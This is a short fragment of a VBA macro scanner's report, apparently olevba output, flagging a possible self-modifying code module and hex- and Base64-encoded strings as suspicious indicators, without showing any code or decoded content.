|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

